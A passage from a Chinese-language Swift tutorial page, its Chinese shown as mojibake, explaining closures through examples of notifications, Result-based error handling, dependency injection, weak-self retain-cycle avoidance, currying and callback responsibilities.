    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¤„ç†ç»“æœï¼š<span class="hljs-subst">\(results)</span>"</span>)  <span class="hljs-comment">// [1, 4, 9, 16, 25]</span>
}
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šåå°æ•°æ®å¤„ç†ã€æ–‡ä»¶æ“ä½œç­‰éƒ½éœ€è¦å¤šçº¿ç¨‹ã€‚</p>
<h5 data-id="heading-40">6. <strong>é€šçŸ¥ä¸­å¿ƒ</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> Foundation

<span class="hljs-keyword">class</span> <span class="hljs-title class_">NotificationManager</span> {

    <span class="hljs-keyword">init</span>() {
        <span class="hljs-comment">// ç›‘å¬é”®ç›˜é€šçŸ¥</span>
        <span class="hljs-type">NotificationCenter</span>.default.addObserver(
            forName: <span class="hljs-type">UIResponder</span>.keyboardWillShowNotification,
            object: <span class="hljs-literal">nil</span>,
            queue: .main
        ) { notification <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> keyboardFrame <span class="hljs-operator">=</span> notification.userInfo<span class="hljs-operator">?</span>[<span class="hljs-type">UIResponder</span>.keyboardFrameEndUserInfoKey] <span class="hljs-keyword">as?</span> <span class="hljs-type">CGRect</span> {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"é”®ç›˜é«˜åº¦ï¼š<span class="hljs-subst">\(keyboardFrame.height)</span>"</span>)
                <span class="hljs-comment">// è°ƒæ•´UIå¸ƒå±€</span>
            }
        }

        <span class="hljs-comment">// è‡ªå®šä¹‰é€šçŸ¥</span>
        <span class="hljs-type">NotificationCenter</span>.default.addObserver(
            <span class="hljs-keyword">self</span>,
            selector: <span class="hljs-keyword">#selector</span>(handleCustomNotification(<span class="hljs-keyword">_</span>:)),
            name: <span class="hljs-type">NSNotification</span>.<span class="hljs-type">Name</span>(<span class="hljs-string">"CustomNotification"</span>),
            object: <span class="hljs-literal">nil</span>
        )
    }

    <span class="hljs-keyword">@objc</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">handleCustomNotification</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">notification</span>: <span class="hljs-type">Notification</span>) {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> userInfo <span class="hljs-operator">=</span> notification.userInfo {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ”¶åˆ°è‡ªå®šä¹‰é€šçŸ¥ï¼š<span class="hljs-subst">\(userInfo)</span>"</span>)
        }
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">postCustomNotification</span>() {
        <span class="hljs-type">NotificationCenter</span>.default.post(
            name: <span class="hljs-type">NSNotification</span>.<span class="hljs-type">Name</span>(<span class="hljs-string">"CustomNotification"</span>),
            object: <span class="hljs-keyword">self</span>,
            userInfo: [<span class="hljs-string">"message"</span>: <span class="hljs-string">"Hello from notification!"</span>]
        )
    }
}
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šç³»ç»Ÿé€šçŸ¥å’Œåº”ç”¨å†…ç»„ä»¶é€šä¿¡ã€‚</p>
<h5 data-id="heading-41">7. <strong>é”™è¯¯å¤„ç†</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">NetworkError</span>: <span class="hljs-title class_">Error</span> {
    <span class="hljs-keyword">case</span> invalidURL
    <span class="hljs-keyword">case</span> noData
    <span class="hljs-keyword">case</span> parsingError
}

<span class="hljs-keyword">func</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params">from</span> <span class="hljs-params">urlString</span>: <span class="hljs-type">String</span>, <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">Result</span>&lt;<span class="hljs-type">Data</span>, <span class="hljs-type">NetworkError</span>&gt;) -&gt; <span class="hljs-type">Void</span>) {
    <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> url <span class="hljs-operator">=</span> <span class="hljs-type">URL</span>(string: urlString) <span class="hljs-keyword">else</span> {
        completion(.failure(.invalidURL))
        <span class="hljs-keyword">return</span>
    }

    <span class="hljs-type">URLSession</span>.shared.dataTask(with: url) { data, response, error <span class="hljs-keyword">in</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> error <span class="hljs-operator">=</span> error {
            completion(.failure(.noData))
            <span class="hljs-keyword">return</span>
        }

        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> data <span class="hljs-keyword">else</span> {
            completion(.failure(.noData))
            <span class="hljs-keyword">return</span>
        }

        completion(.success(data))
    }.resume()
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
fetchData(from: <span class="hljs-string">"https://api.example.com/data"</span>) { result <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">switch</span> result {
    <span class="hljs-keyword">case</span> .success(<span class="hljs-keyword">let</span> data):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"è·å–æ•°æ®æˆåŠŸï¼Œå¤§å°ï¼š<span class="hljs-subst">\(data.count)</span> bytes"</span>)
        <span class="hljs-comment">// å¤„ç†æ•°æ®</span>
    <span class="hljs-keyword">case</span> .failure(<span class="hljs-keyword">let</span> error):
        <span class="hljs-keyword">switch</span> error {
        <span class="hljs-keyword">case</span> .invalidURL:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ— æ•ˆçš„URL"</span>)
        <span class="hljs-keyword">case</span> .noData:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ²¡æœ‰æ•°æ®"</span>)
        <span class="hljs-keyword">case</span> .parsingError:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"è§£æé”™è¯¯"</span>)
        }
    }
}
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶æ“ä½œç­‰å¯èƒ½å‡ºé”™çš„æ“ä½œã€‚</p>
<h5 data-id="heading-42">8. <strong>ä¾èµ–æ³¨å…¥å’Œé…ç½®</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkService</span> {

    <span class="hljs-keyword">typealias</span> <span class="hljs-type">RequestCompletion</span> <span class="hljs-operator">=</span> (<span class="hljs-type">Result</span>&lt;<span class="hljs-type">Data</span>, <span class="hljs-type">Error</span>&gt;) -&gt; <span class="hljs-type">Void</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> session: <span class="hljs-type">URLSession</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> baseURL: <span class="hljs-type">URL</span>

    <span class="hljs-keyword">init</span>(<span class="hljs-params">session</span>: <span class="hljs-type">URLSession</span> <span class="hljs-operator">=</span> .shared, <span class="hljs-params">baseURL</span>: <span class="hljs-type">URL</span>) {
        <span class="hljs-keyword">self</span>.session <span class="hljs-operator">=</span> session
        <span class="hljs-keyword">self</span>.baseURL <span class="hljs-operator">=</span> baseURL
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">endpoint</span>: <span class="hljs-type">String</span>, <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">RequestCompletion</span>) {
        <span class="hljs-keyword">let</span> url <span class="hljs-operator">=</span> baseURL.appendingPathComponent(endpoint)
        session.dataTask(with: url) { data, <span class="hljs-keyword">_</span>, error <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> error <span class="hljs-operator">=</span> error {
                completion(.failure(error))
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> data {
                completion(.success(data))
            }
        }.resume()
    }
}

<span class="hljs-comment">// é…ç½®ä¸åŒçš„ç¯å¢ƒ</span>
<span class="hljs-keyword">let</span> developmentConfig <span class="hljs-operator">=</span> <span class="hljs-type">NetworkService</span>(
    session: <span class="hljs-type">URLSession</span>.shared,
    baseURL: <span class="hljs-type">URL</span>(string: <span class="hljs-string">"https://dev-api.example.com"</span>)<span class="hljs-operator">!</span>
)

<span class="hljs-keyword">let</span> productionConfig <span class="hljs-operator">=</span> <span class="hljs-type">NetworkService</span>(
    session: <span class="hljs-type">URLSession</span>.shared,
    baseURL: <span class="hljs-type">URL</span>(string: <span class="hljs-string">"https://api.example.com"</span>)<span class="hljs-operator">!</span>
)
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šæ¡†æ¶é…ç½®ã€æµ‹è¯•mockç­‰ã€‚</p>
<h5 data-id="heading-43">9. <strong>å†…å­˜ç®¡ç†å’Œå¾ªç¯å¼•ç”¨</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewModel</span> {

    <span class="hljs-keyword">var</span> data: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">var</span> onDataUpdate: (() -&gt; <span class="hljs-type">Void</span>)<span class="hljs-operator">?</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadData</span>() {
        <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥æ•°æ®åŠ è½½</span>
        <span class="hljs-type">DispatchQueue</span>.global().async { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] <span class="hljs-keyword">in</span>  <span class="hljs-comment">// æ•è·å¼±å¼•ç”¨</span>
            <span class="hljs-keyword">let</span> newData <span class="hljs-operator">=</span> [<span class="hljs-string">"Item 1"</span>, <span class="hljs-string">"Item 2"</span>, <span class="hljs-string">"Item 3"</span>]

            <span class="hljs-type">DispatchQueue</span>.main.async {
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.data <span class="hljs-operator">=</span> newData
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.onDataUpdate<span class="hljs-operator">?</span>()  <span class="hljs-comment">// è°ƒç”¨é—­åŒ…</span>
            }
        }
    }

    <span class="hljs-keyword">deinit</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ViewModel è¢«é‡Šæ”¾"</span>)
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewController</span> {

    <span class="hljs-keyword">let</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">ViewModel</span>()

    <span class="hljs-keyword">init</span>() {
        <span class="hljs-comment">// ä½¿ç”¨ [weak self] é¿å…å¾ªç¯å¼•ç”¨</span>
        viewModel.onDataUpdate <span class="hljs-operator">=</span> { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.updateUI()
        }
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateUI</span>() {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"UIå·²æ›´æ–°"</span>)
    }

    <span class="hljs-keyword">deinit</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ViewController è¢«é‡Šæ”¾"</span>)
    }
}
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šMVC/MVVMæ¶æ„ä¸­Viewå’ŒViewModelçš„é€šä¿¡ã€‚</p>
<h5 data-id="heading-44">10. <strong>å‡½æ•°å¼ç¼–ç¨‹æ¨¡å¼</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å‡½æ•°ç»„åˆ</span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">compose</span>&lt;<span class="hljs-type">A</span>, <span class="hljs-type">B</span>, <span class="hljs-type">C</span>&gt;(<span class="hljs-keyword">_</span> <span class="hljs-params">f</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">B</span>) -&gt; <span class="hljs-type">C</span>, <span class="hljs-keyword">_</span> <span class="hljs-params">g</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>) -&gt; (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">C</span> {
    <span class="hljs-keyword">return</span> { x <span class="hljs-keyword">in</span> f(g(x)) }
}

<span class="hljs-comment">// æŸ¯é‡ŒåŒ–</span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">curry</span>&lt;<span class="hljs-type">A</span>, <span class="hljs-type">B</span>, <span class="hljs-type">C</span>&gt;(<span class="hljs-keyword">_</span> <span class="hljs-params">f</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">A</span>, <span class="hljs-type">B</span>) -&gt; <span class="hljs-type">C</span>) -&gt; (<span class="hljs-type">A</span>) -&gt; (<span class="hljs-type">B</span>) -&gt; <span class="hljs-type">C</span> {
    <span class="hljs-keyword">return</span> { a <span class="hljs-keyword">in</span> { b <span class="hljs-keyword">in</span> f(a, b) } }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">let</span> add <span class="hljs-operator">=</span> { (a: <span class="hljs-type">Int</span>, b: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> <span class="hljs-keyword">in</span> a <span class="hljs-operator">+</span> b }
<span class="hljs-keyword">let</span> curriedAdd <span class="hljs-operator">=</span> curry(add)
<span class="hljs-keyword">let</span> add5 <span class="hljs-operator">=</span> curriedAdd(<span class="hljs-number">5</span>)
<span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> add5(<span class="hljs-number">3</span>)  <span class="hljs-comment">// 8</span>

<span class="hljs-keyword">let</span> double <span class="hljs-operator">=</span> { (x: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> <span class="hljs-keyword">in</span> x <span class="hljs-operator">*</span> <span class="hljs-number">2</span> }
<span class="hljs-keyword">let</span> square <span class="hljs-operator">=</span> { (x: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> <span class="hljs-keyword">in</span> x <span class="hljs-operator">*</span> x }
<span class="hljs-keyword">let</span> doubleThenSquare <span class="hljs-operator">=</span> compose(square, double)
<span class="hljs-keyword">let</span> result2 <span class="hljs-operator">=</span> doubleThenSquare(<span class="hljs-number">3</span>)  <span class="hljs-comment">// (3*2)^2 = 36</span>
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼šå‡½æ•°å¼ç¼–ç¨‹é£æ ¼çš„ä»£ç ç»„ç»‡ã€‚</p>
<h4 data-id="heading-45">ç»ƒä¹ å»ºè®®</h4>
<ol>
<li>
<p><strong>è®°å¿†å£è¯€</strong>ï¼š</p>
<ul>
<li>"æœ‰å°¾éšï¼Œæ— æ ‡ç­¾ï¼›å¯çœç•¥ï¼Œæ¨æ–­å¼º"</li>
<li>"å‚æ•°å¤šï¼Œç”¨$0ï¼›å•è¡¨è¾¾å¼ï¼Œreturnçœç•¥"</li>
</ul>
</li>
<li>
<p><strong>å¸¸è§é”™è¯¯é¿å…</strong>ï¼š</p>
<ul>
<li>é—­åŒ…å‚æ•°ç±»å‹ä¸å‡½æ•°æœŸæœ›ä¸åŒ¹é…</li>
<li>å¿˜è®°å¤„ç†é—­åŒ…ä¸­çš„é”™è¯¯</li>
<li>å¾ªç¯å¼•ç”¨å¯¼è‡´çš„å†…å­˜æ³„æ¼</li>
</ul>
</li>
<li>
<p><strong>è°ƒè¯•æŠ€å·§</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>print</code>è¯­å¥è°ƒè¯•é—­åŒ…æ‰§è¡Œ</li>
<li>æ³¨æ„é—­åŒ…æ•è·çš„å˜é‡ä½œç”¨åŸŸ</li>
<li>ä½¿ç”¨<code>weak self</code>é¿å…å¾ªç¯å¼•ç”¨</li>
</ul>
</li>
</ol>
<h3 data-id="heading-46">é—­åŒ…é€»è¾‘å®ç°çš„æœ¬è´¨åˆ†æ</h3>
<h4 data-id="heading-47">æ ¸å¿ƒæ¦‚å¿µï¼šé€»è¾‘å®šä¹‰ vs é€»è¾‘æ‰§è¡Œ</h4>
<h5 data-id="heading-48">1. <strong>é—­åŒ…å®šä¹‰äº†é€»è¾‘ï¼Œå‡½æ•°è°ƒç”¨äº†é€»è¾‘</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å‡½æ•°å®šä¹‰ï¼šåªè´Ÿè´£è°ƒç”¨é—­åŒ…ï¼Œä¸å®ç°å…·ä½“é€»è¾‘</span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params">data</span>: [<span class="hljs-type">Int</span>], <span class="hljs-params">operation</span>: (<span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">String</span>) {
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data {
        <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> operation(item)  <span class="hljs-comment">// è¿™é‡Œè°ƒç”¨é—­åŒ…ï¼Œæ‰§è¡Œé€»è¾‘</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¤„ç†ç»“æœï¼š<span class="hljs-subst">\(result)</span>"</span>)
    }
}

<span class="hljs-comment">// é—­åŒ…å®šä¹‰ï¼šå®ç°å…·ä½“é€»è¾‘</span>
<span class="hljs-keyword">let</span> doubleAndFormat <span class="hljs-operator">=</span> { (number: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">String</span> <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">let</span> doubled <span class="hljs-operator">=</span> number <span class="hljs-operator">*</span> <span class="hljs-number">2</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"æ•°å­— <span class="hljs-subst">\(number)</span> çš„ä¸¤å€æ˜¯ <span class="hljs-subst">\(doubled)</span>"</span>
}

<span class="hljs-comment">// ä½¿ç”¨ï¼šä¼ é€’é—­åŒ…ç»™å‡½æ•°</span>
<span class="hljs-keyword">let</span> numbers <span class="hljs-operator">=</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
processData(data: numbers, operation: doubleAndFormat)
</code></pre>
<p><strong>è¾“å‡ºç»“æœ</strong>ï¼š</p>
<pre><code class="hljs">å¤„ç†ç»“æœï¼šæ•°å­— 1 çš„ä¸¤å€æ˜¯ 2
å¤„ç†ç»“æœï¼šæ•°å­— 2 çš„ä¸¤å€æ˜¯ 4
å¤„ç†ç»“æœï¼šæ•°å­— 3 çš„ä¸¤å€æ˜¯ 6
å¤„ç†ç»“æœï¼šæ•°å­— 4 çš„ä¸¤å€æ˜¯ 8
å¤„ç†ç»“æœï¼šæ•°å­— 5 çš„ä¸¤å€æ˜¯ 10
</code></pre>
<h5 data-id="heading-49">2. <strong>åˆ†ææ‰§è¡Œæµç¨‹</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">downloadImage</span>(<span class="hljs-params">url</span>: <span class="hljs-type">String</span>, <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">UIImage</span>?) -&gt; <span class="hljs-type">Void</span>) {
    <span class="hljs-comment">// ç¬¬1æ­¥ï¼šå‡½æ•°å¼€å§‹æ‰§è¡Œï¼Œå‡†å¤‡å¼‚æ­¥æ“ä½œ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¼€å§‹ä¸‹è½½å›¾ç‰‡ï¼š<span class="hljs-subst">\(url)</span>"</span>)

    <span class="hljs-type">DispatchQueue</span>.global().async {
        <span class="hljs-comment">// ç¬¬2æ­¥ï¼šæ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚ï¼ˆè¿™é‡Œä¸å®ç°å…·ä½“é€»è¾‘ï¼‰</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ­£åœ¨ä»ç½‘ç»œè·å–å›¾ç‰‡..."</span>)
        <span class="hljs-type">Thread</span>.sleep(forTimeInterval: <span class="hljs-number">1.0</span>)

        <span class="hljs-comment">// ç¬¬3æ­¥ï¼šæ¨¡æ‹Ÿè·å–å›¾ç‰‡æˆåŠŸ</span>
        <span class="hljs-keyword">let</span> image <span class="hljs-operator">=</span> <span class="hljs-type">UIImage</span>(systemName: <span class="hljs-string">"photo"</span>)

        <span class="hljs-comment">// ç¬¬4æ­¥ï¼šå›åˆ°ä¸»çº¿ç¨‹ï¼Œè°ƒç”¨é—­åŒ…</span>
        <span class="hljs-type">DispatchQueue</span>.main.async {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç½‘ç»œè¯·æ±‚å®Œæˆï¼Œè°ƒç”¨completioné—­åŒ…"</span>)
            completion(image)  <span class="hljs-comment">// æ‰§è¡Œé—­åŒ…ï¼šUIæ›´æ–°é€»è¾‘åœ¨è¿™é‡Œæ‰§è¡Œ</span>
        }
    }
}

<span class="hljs-comment">// é—­åŒ…å®šä¹‰UIæ›´æ–°é€»è¾‘</span>
<span class="hljs-keyword">let</span> imageView <span class="hljs-operator">=</span> <span class="hljs-type">UIImageView</span>()
downloadImage(url: <span class="hljs-string">"https://example.com/image.jpg"</span>) { downloadedImage <span class="hljs-keyword">in</span>
    <span class="hljs-comment">// ç¬¬5æ­¥ï¼šé—­åŒ…æ‰§è¡Œï¼Œå®ç°UIæ›´æ–°é€»è¾‘</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"é—­åŒ…æ‰§è¡Œï¼šæ›´æ–°UI"</span>)
    imageView.image <span class="hljs-operator">=</span> downloadedImage
    imageView.setNeedsDisplay()
}
</code></pre>
<p><strong>æ‰§è¡Œé¡ºåºåˆ†æ</strong>ï¼š</p>
<ol>
<li><code>downloadImage</code>å‡½æ•°å¼€å§‹æ‰§è¡Œï¼ˆç½‘ç»œè¯·æ±‚å‡†å¤‡ï¼‰</li>
<li>å¼‚æ­¥æ‰§è¡Œç½‘ç»œè¯·æ±‚ï¼ˆä¸åŒ…å«UIé€»è¾‘ï¼‰</li>
<li>ç½‘ç»œè¯·æ±‚å®Œæˆï¼Œå›åˆ°ä¸»çº¿ç¨‹</li>
<li><strong>è°ƒç”¨é—­åŒ…</strong>ï¼š<code>completion(image)</code> - è¿™æ˜¯å‡½æ•°è°ƒç”¨é—­åŒ…çš„åœ°æ–¹</li>
<li><strong>é—­åŒ…æ‰§è¡Œ</strong>ï¼š<code>imageView.image = downloadedImage</code> - è¿™æ˜¯UIé€»è¾‘å®ç°çš„åœ°æ–¹</li>
</ol>
<h4 data-id="heading-50">å…³é”®ç†è§£ç‚¹</h4>
<h5 data-id="heading-51"><strong>è°è´Ÿè´£å®ç°é€»è¾‘ï¼Ÿ</strong></h5>
<ol>
<li>
<p><strong>å‡½æ•°ï¼ˆè°ƒç”¨è€…ï¼‰</strong>ï¼š</p>
<ul>
<li>å®šä¹‰æ¥å£å’Œè°ƒç”¨æ—¶æœº</li>
<li>è´Ÿè´£æ•°æ®å‡†å¤‡å’Œä¼ é€’</li>
<li>å†³å®šä½•æ—¶è°ƒç”¨é—­åŒ…</li>
</ul>
</li>
<li>
<p><strong>é—­åŒ…ï¼ˆè¢«è°ƒç”¨è€…ï¼‰</strong>ï¼š</p>
<ul>
<li>å®ç°å…·ä½“çš„ä¸šåŠ¡é€»è¾‘</li>
<li>å¤„ç†ä¼ é€’çš„æ•°æ®</li>
<li>æ‰§è¡Œæœ€ç»ˆçš„æ“ä½œ</li>
</ul>
</li>
</ol>
<h5 data-id="heading-52"><strong>å®é™…å¼€å‘ä¸­çš„èŒè´£åˆ†ç¦»</strong></h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkManager</span> {
    <span class="hljs-comment">// å‡½æ•°ï¼šåªè´Ÿè´£ç½‘ç»œè¯·æ±‚ï¼Œä¸è´Ÿè´£æ•°æ®å¤„ç†</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">Result</span>&lt;<span class="hljs-type">User</span>, <span class="hljs-type">Error</span>&gt;) -&gt; <span class="hljs-type">Void</span>) {
        <span class="hljs-comment">// ç½‘ç»œè¯·æ±‚é€»è¾‘åœ¨è¿™é‡Œå®ç°</span>
        <span class="hljs-type">URLSession</span>.shared.dataTask(with: userURL) { data, <span class="hljs-keyword">_</span>, error <span class="hljs-keyword">in</span>
            <span class="hljs-comment">// æ•°æ®å¤„ç†é€»è¾‘åœ¨è¿™é‡Œå®ç°</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> error <span class="hljs-operator">=</span> error {
                completion(.failure(error))
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> data {
                <span class="hljs-comment">// è§£æé€»è¾‘åœ¨è¿™é‡Œå®ç°</span>
                <span class="hljs-keyword">do</span> {
                    <span class="hljs-keyword">let</span> user <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-type">JSONDecoder</span>().decode(<span class="hljs-type">User</span>.<span class="hljs-keyword">self</span>, from: data)
                    completion(.success(user))
                } <span class="hljs-keyword">catch</span> {
                    completion(.failure(error))
                }
            }
        }.resume()
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewController</span>: <span class="hljs-title class_">UIViewController</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> networkManager <span class="hljs-operator">=</span> <span class="hljs-type">NetworkManager</span>()

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUser</span>() {
        <span class="hljs-comment">// UIé€»è¾‘åœ¨è¿™é‡Œå®ç°</span>
        networkManager.fetchUserData { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] result <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">switch</span> result {
            <span class="hljs-keyword">case</span> .success(<span class="hljs-keyword">let</span> user):
                <span class="hljs-comment">// UIæ›´æ–°é€»è¾‘åœ¨è¿™é‡Œå®ç°</span>
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.updateUI(with: user)
            <span class="hljs-keyword">case</span> .failure(<span class="hljs-keyword">let</span> error):
                <span class="hljs-comment">// é”™è¯¯å¤„ç†UIé€»è¾‘åœ¨è¿™é‡Œå®ç°</span>
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.showError(error)
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateUI</span>(<span class="hljs-params">with</span> <span class="hljs-params">user</span>: <span class="hljs-type">User</span>) {
        nameLabel.text <span class="hljs-operator">=</span> user.name
        ageLabel.text <span class="hljs-operator">=</span> <span class="hljs-string">"<span class="hljs-subst">\(user.age)</span>å²"</span>
        <span class="hljs-comment">// æ›´å¤šUIæ›´æ–°é€»è¾‘...</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">showError</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">error</span>: <span class="hljs-type">Error</span>) {
        <span class="hljs-keyword">let</span> alert <span class="hljs-operator">=</span> <span class="hljs-type">UIAlertController</span>(title: <span class="hljs-string">"é”™è¯¯"</span>, message: error.localizedDescription, preferredStyle: .alert)
        present(alert, animated: <span class="hljs-literal">true</span>)
    }
}
</code></pre>
<h4 data-id="heading-53">è®°å¿†æ€»ç»“</h4>
<p><strong>å‡½æ•° vs é—­åŒ…çš„èŒè´£åˆ†å·¥</strong>ï¼š</p>






























<table><thead><tr><th>æ–¹é¢</th><th>å‡½æ•°ï¼ˆè°ƒç”¨è€…ï¼‰</th><th>é—­åŒ…ï¼ˆè¢«è°ƒç”¨è€…ï¼‰</th></tr></thead><tbody><tr><td><strong>é€»è¾‘å®ç°</strong></td><td>æ¡†æ¶é€»è¾‘ã€æµç¨‹æ§åˆ¶</td><td>å…·ä½“ä¸šåŠ¡é€»è¾‘ã€æ•°æ®å¤„ç†</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>å†³å®šä½•æ—¶æ‰§è¡Œ</td><td>è¢«è°ƒç”¨æ—¶æ‰§è¡Œ</td></tr><tr><td><strong>å…³æ³¨ç‚¹</strong></td><td>ä½•æ—¶åšã€å¦‚ä½•ä¼ é€’æ•°æ®</td><td>åšä»€ä¹ˆã€å¦‚ä½•å¤„ç†æ•°æ®</td></tr><tr><td><strong>å¯å¤ç”¨æ€§</strong></td><td>å›ºå®šæµç¨‹ï¼Œçµæ´»å›è°ƒ</td><td>æ¯æ¬¡ä½¿ç”¨å¯ä»¥ä¸åŒé€»è¾‘</td></tr></tbody></table>
<p><strong>ç»å…¸æ¯”å–»</strong>ï¼š</p>
<ul>
<li>å‡½æ•°æ˜¯"é¥­åº—å¨å¸ˆ"ï¼šè´Ÿè´£å‡†å¤‡é£Ÿæå’Œçƒ¹é¥ªç¯å¢ƒ</li>
<li>é—­åŒ…æ˜¯"é¡¾å®¢ç‚¹çš„èœè°±"ï¼šå‘Šè¯‰å¨å¸ˆå…·ä½“åšä»€ä¹ˆèœ</li>
<li>è°ƒç”¨é—­åŒ…æ˜¯"ä¸Šèœ"ï¼šå¨å¸ˆæŒ‰ç…§èœè°±åšå‡ºèœç»™é¡¾å®¢</li>
</ul>
<p><strong>ä»£ç å±‚é¢çš„ç†è§£</strong>ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å‡½æ•°å®šä¹‰äº†"åšä»€ä¹ˆäº‹"çš„æ¡†æ¶</span>
